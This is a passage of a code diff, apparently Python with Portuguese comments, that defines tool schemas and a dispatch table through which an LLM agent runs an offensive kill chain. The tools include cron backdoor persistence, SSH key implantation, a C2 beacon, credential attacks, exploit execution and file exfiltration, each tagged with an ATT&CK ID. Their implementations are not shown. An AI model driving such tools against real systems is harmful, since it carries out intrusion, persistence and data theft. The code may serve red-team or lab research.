+                "name": "persist_backdoor", "description": "T1053.003: instala backdoor verificavel via cron com token (aguarda ~70s pelo disparo autonomo; requer canal SSH verificado)",
+                "parameters": {"type": "object", "properties": {
+                    "host_ip": {"type": "string"}}, "required": ["host_ip"]}}},
+            {"type": "function", "function": {
+                "name": "persist_ssh_key", "description": "T1098.004: adiciona chave SSH com marker ao authorized_keys e VERIFICA reconectando com ela (canario independente)",
+                "parameters": {"type": "object", "properties": {
+                    "host_ip": {"type": "string"}}, "required": ["host_ip"]}}},
+            {"type": "function", "function": {
+                "name": "c2_callback", "description": "T1071: dispara beacon do alvo ao listener C2 (verificado pelo token que chega ao socket)",
+                "parameters": {"type": "object", "properties": {
+                    "host_ip": {"type": "string"}}, "required": ["host_ip"]}}},
+            {"type": "function", "function": {
+                "name": "exfiltrate", "description": "T1041: exfiltra o crown jewel pelo canal verificado (sha256 local); conclui a kill chain",
+                "parameters": {"type": "object", "properties": {
+                    "host_ip": {"type": "string"},
+                    "path": {"type": "string", "description": "default: crown_jewel do inventario"}},
+                    "required": ["host_ip"]}}},
+        ]
+
+    def dispatch(self, name: str, args: dict) -> dict:
+        """Roteia chamada do LLM/MCP para a tool correspondente."""
+        table: dict[str, Callable[..., dict]] = {
+            "get_state": self.tool_get_state,
+            "get_vuln_hints": self.tool_get_vuln_hints,
+            "ping_sweep": self.tool_ping_sweep,
+            "service_scan": self.tool_service_scan,
+            "vuln_scan": self.tool_vuln_scan,
+            "web_discover": self.tool_web_discover,
+            "http_probe": self.tool_http_probe,
+            "net_probe": self.tool_net_probe,
+            "run_command": self.tool_run_command,
+            "exploit_search": self.tool_exploit_search,
+            "exploit_execute": self.tool_exploit_execute,
+            "cve_lookup": self.tool_cve_lookup,
+            "ssh_login": self.tool_ssh_login,
+            "cred_attack": self.tool_cred_attack,
+            "remote_exec": self.tool_remote_exec,
+            "check_root": self.tool_check_root,
+            "privesc_scan": self.tool_privesc_scan,
+            "read_file": self.tool_read_file,
+            "persist_backdoor": self.tool_persist_backdoor,
+            "persist_ssh_key": self.tool_persist_ssh_key,
+            "c2_callback": self.tool_c2_callback,
+            "exfiltrate": self.tool_exfiltrate,
+        }
+        fn = table.get(name)
+        if fn is None:
+            return {"ok": False, "error": f"tool desconhecida: {name}"}
+        try:
+            return fn(**args)
+        except Exception as e:
+            return {"ok": False, "error": f"{type(e).__name__}: {e}"}
+
+
+def sha256_file(path: Path) -> str:
+    h = hashlib.sha256()
+    h.update(path.read_bytes())
+    return h.hexdigest()
